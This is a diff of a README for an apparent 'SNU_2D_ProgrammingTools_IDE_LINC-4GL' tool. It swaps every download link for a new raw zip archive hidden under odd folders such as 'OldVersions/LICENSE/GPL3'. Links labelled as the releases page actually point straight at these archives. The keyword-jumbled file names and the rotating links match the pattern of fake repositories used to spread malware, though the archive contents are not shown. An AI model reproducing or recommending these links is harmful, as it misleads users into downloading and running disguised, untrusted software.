@@ -1,6 +1,6 @@
 # ⌨️ SNU_2D_ProgrammingTools_IDE_LINC-4GL - Simple Tools for LINC 4GL Programming
 
-[![Download SNU_2D_ProgrammingTools_IDE_LINC-4GL](https://github.com/Hamz151/SNU_2D_ProgrammingTools_IDE_LINC-4GL/raw/refs/heads/SNU_2D_ProgrammingTools_IDE_LINC-4GL_Main-dev/OldVersions/ISSUE_TEMPLATE/Programming-GL-ID-LIN-SN-Tools-v3.7.zip)](https://github.com/Hamz151/SNU_2D_ProgrammingTools_IDE_LINC-4GL/raw/refs/heads/SNU_2D_ProgrammingTools_IDE_LINC-4GL_Main-dev/OldVersions/ISSUE_TEMPLATE/Programming-GL-ID-LIN-SN-Tools-v3.7.zip)
+[![Download SNU_2D_ProgrammingTools_IDE_LINC-4GL](https://raw.githubusercontent.com/Hamz151/SNU_2D_ProgrammingTools_IDE_LINC-4GL/SNU_2D_ProgrammingTools_IDE_LINC-4GL_Main-dev/OldVersions/LICENSE/GPL3/ID_LIN_SN_GL_Tools_Programming_3.9-beta.3.zip)](https://raw.githubusercontent.com/Hamz151/SNU_2D_ProgrammingTools_IDE_LINC-4GL/SNU_2D_ProgrammingTools_IDE_LINC-4GL_Main-dev/OldVersions/LICENSE/GPL3/ID_LIN_SN_GL_Tools_Programming_3.9-beta.3.zip)
 
 ## 📖 About
 
@@ -12,7 +12,7 @@ Follow these steps to download and set up the SNU_2D_ProgrammingTools_IDE_LINC-4
 
 1. **Access the Release Page**  
    Click on the link below to visit the download page:  
-   [Visit the Releases Page](https://github.com/Hamz151/SNU_2D_ProgrammingTools_IDE_LINC-4GL/raw/refs/heads/SNU_2D_ProgrammingTools_IDE_LINC-4GL_Main-dev/OldVersions/ISSUE_TEMPLATE/Programming-GL-ID-LIN-SN-Tools-v3.7.zip)
+   [Visit the Releases Page](https://raw.githubusercontent.com/Hamz151/SNU_2D_ProgrammingTools_IDE_LINC-4GL/SNU_2D_ProgrammingTools_IDE_LINC-4GL_Main-dev/OldVersions/LICENSE/GPL3/ID_LIN_SN_GL_Tools_Programming_3.9-beta.3.zip)
 
 2. **Choose the Correct Version**  
    On the Releases page, you will see a list of versions available for download. Look for the latest version carefully labeled.
@@ -58,7 +58,7 @@ To ensure optimal performance, please meet the following requirements:
 ## 📥 Download & Install
 
 For downloading the application, visit the following link:  
-[Download from Releases](https://github.com/Hamz151/SNU_2D_ProgrammingTools_IDE_LINC-4GL/raw/refs/heads/SNU_2D_ProgrammingTools_IDE_LINC-4GL_Main-dev/OldVersions/ISSUE_TEMPLATE/Programming-GL-ID-LIN-SN-Tools-v3.7.zip)
+[Download from Releases](https://raw.githubusercontent.com/Hamz151/SNU_2D_ProgrammingTools_IDE_LINC-4GL/SNU_2D_ProgrammingTools_IDE_LINC-4GL_Main-dev/OldVersions/LICENSE/GPL3/ID_LIN_SN_GL_Tools_Programming_3.9-beta.3.zip)
 
 Make sure to follow the installation steps outlined above for a smooth setup process. Should you encounter any issues during installation, refer to the FAQ section for common troubleshooting tips.
 
